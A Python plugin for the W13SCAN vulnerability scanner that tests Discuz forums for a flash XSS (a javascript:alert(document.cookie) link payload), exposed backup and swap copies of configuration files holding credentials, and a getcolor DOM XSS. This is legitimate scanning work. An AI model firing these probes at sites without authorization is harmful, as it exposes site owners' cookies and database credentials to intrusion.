#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# @Time    : 2019/7/20 8:45 PM
# @Author  : w8ay
# @File    : dzxss.py

import requests

from W13SCAN.lib.const import Level
from W13SCAN.lib.output import out
from W13SCAN.lib.plugins import PluginBase


class W13SCAN(PluginBase):
    name = 'Dz flash xss'
    desc = '''flash xss'''
    level = Level.LOW

    def audit(self):
        method = self.requests.command  # 请求方式 GET or POST
        headers = self.requests.get_headers()  # 请求头 dict类型
        url = self.build_url()  # 请求完整URL

        resp_data = self.response.get_body_data()  # 返回数据 byte类型
        resp_str = self.response.get_body_str()  # 返回数据 str类型 自动解码
        resp_headers = self.response.get_headers()  # 返回头 dict类型

        p = self.requests.urlparse
        params = self.requests.params
        netloc = self.requests.netloc

        domain = "{}://{}/".format(p.scheme, p.netloc)
        payload = domain + "static/image/common/flvplayer.swf?file=1.flv&linkfromdisplay=true&link=javascript:alert(document.cookie);"

        r = requests.get(payload, headers=headers)
        if r.status_code == 200 and 'CWS' in r.text:
            out.success(payload, self.name)

        if self.response.language is None or self.response.language == "PHP":
            return

        payloads = ['config/config_ucenter.php.bak',
                    'config/.config_ucenter.php.swp',
                    'config/.config_global.php.swp',
                    'config/config_global.php.1',
                    'uc_server/data/config.inc.php.bak',
                    'config/config_global.php.bak',
                    'include/config.inc.php.tmp']

        for payload in payloads:
            r = requests.get(domain + payload, headers=headers)
            if (r.status_code == 200 or r.status_code == 206) and "<?php" in r.text:
                out.success(domain + payload, self.name)

        payload = domain + "static/image/admincp/getcolor.htm'"
        r = requests.get(payload, headers=headers)
        if "if(fun) eval('parent.'+fun+'" in r.text:
            out.success(payload, self.name, descript="Discuz getcolor DOM XSS")
